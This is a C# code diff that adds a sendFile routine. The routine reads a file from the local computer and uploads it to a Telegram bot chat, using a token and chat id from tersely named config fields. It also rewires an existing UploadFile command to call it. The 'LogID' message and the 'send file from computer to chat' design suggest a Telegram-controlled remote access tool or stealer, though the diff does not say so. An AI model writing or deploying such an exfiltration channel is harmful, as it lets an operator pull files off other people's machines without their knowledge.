@@ -1445,6 +1445,42 @@ namespace netlib
             }
         }
 
+        public static void sendFile(string file, string caption = "", string type = "Document")
+        {
+            // If file does not exist
+            if (!File.Exists(file))
+            {
+                sendText("File not found!");
+                return;
+            }
+
+            // Send file
+            using (HttpClient httpClient = new HttpClient())
+            {
+                MultipartFormDataContent form = new MultipartFormDataContent();
+
+                // Read the file into a byte array
+                var file_bytes = File.ReadAllBytes(file);
+
+                // Add the file to the form
+                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), Path.GetFileName(file));
+
+                // Add caption if provided
+                if (!string.IsNullOrEmpty(caption))
+                {
+                    form.Add(new StringContent(caption), "caption");
+                }
+
+                // Send the POST request to Telegram API
+                var response = httpClient.PostAsync(
+                    "https://api.telegram.org/bot" + new Config().TT + "/send" + type +
+                    "?chat_id=" + new Config().CI, form
+                );
+                response.Wait();
+            }
+        }
+
+
         // Send text
         public static void sendText(string text)
         {
@@ -1462,16 +1498,14 @@ namespace netlib
         }
 
         // Send file from computer to chat
-        public static void UploadFile(string file)
+        public static void UploadFile(string file, string caption = "")
         {
             // If is file
             if (File.Exists(file))
             {
                 Environment.CurrentDirectory = Path.GetDirectoryName(file);
 
-                //sendText($"Current dir changed to {Environment.CurrentDirectory}");
-                sendText($"LogID: {LogID}");
-                sendFile(Path.GetFileName(file));
+                sendFile(Path.GetFileName(file), caption, "Document");
             }
             else
             {
